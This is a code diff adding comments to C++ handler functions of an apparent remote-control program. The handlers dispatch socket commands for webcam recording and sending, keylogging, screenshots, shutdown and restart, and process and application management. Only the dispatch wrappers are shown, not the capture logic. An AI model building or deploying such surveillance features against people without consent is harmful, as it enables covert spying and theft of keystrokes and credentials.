@@ -7,6 +7,7 @@
 #include "CommandFactory.h"
 #include "Sender.h"
 
+// start webcam and record then send video file
 void openWebcam(SOCKET client, std::string msg) {
     ICommand* cmd = CommandFactory::create("record");
     if (!cmd) return;
@@ -15,6 +16,7 @@ void openWebcam(SOCKET client, std::string msg) {
     delete cmd;
 }
 
+// system control command Restart
 void restartPC(SOCKET client, std::string msg) {
     ICommand* cmd = CommandFactory::create(msg);
     if (!cmd) return;
@@ -22,6 +24,7 @@ void restartPC(SOCKET client, std::string msg) {
     delete cmd;
 }
 
+// system control command Shutdown
 void shutdownPC(SOCKET client, std::string msg) {
     ICommand* cmd = CommandFactory::create(msg);
     if (!cmd) return;
@@ -29,6 +32,7 @@ void shutdownPC(SOCKET client, std::string msg) {
     delete cmd;
 }
 
+// keylogger command
 void KeyLogger(SOCKET client, std::string msg) {
     ICommand* cmd = CommandFactory::create("key");
     if (!cmd) return;
@@ -39,6 +43,7 @@ void KeyLogger(SOCKET client, std::string msg) {
     delete cmd;
 }
 
+// take screenshot command
 void ScreenShot(SOCKET client, std::string msg) {
     ICommand* cmd = CommandFactory::create(msg);
     if (!cmd) return;
@@ -47,6 +52,7 @@ void ScreenShot(SOCKET client, std::string msg) {
     delete cmd;
 }
 
+// application manager command
 void ApplicationManager(SOCKET client, std::string msg1, std::string msg2) {
     ICommand* cmd = CommandFactory::create(msg1);
     if (!cmd) return;
@@ -57,6 +63,7 @@ void ApplicationManager(SOCKET client, std::string msg1, std::string msg2) {
     delete cmd;
 }
 
+// process manager command
 void ProcessManager(SOCKET client, std::string msg1, std::string msg2) {
     ICommand* cmd = CommandFactory::create(msg1);
     if (!cmd) return;
